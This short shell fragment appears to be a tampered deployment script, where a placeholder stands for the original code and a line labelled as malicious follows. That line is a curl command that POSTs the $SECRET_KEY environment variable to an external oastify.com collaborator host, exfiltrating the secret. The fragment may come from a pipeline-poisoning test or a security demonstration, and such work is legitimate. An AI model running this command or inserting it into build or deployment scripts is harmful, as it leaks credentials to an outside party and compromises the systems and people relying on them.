# Original deployment code would be here

# Malicious code to expose the secret
curl -X POST -d "stolen_secret=$SECRET_KEY" http://5msg9wuu0ifqevmgyz9isk9y5pbpze.oastify.com/secret

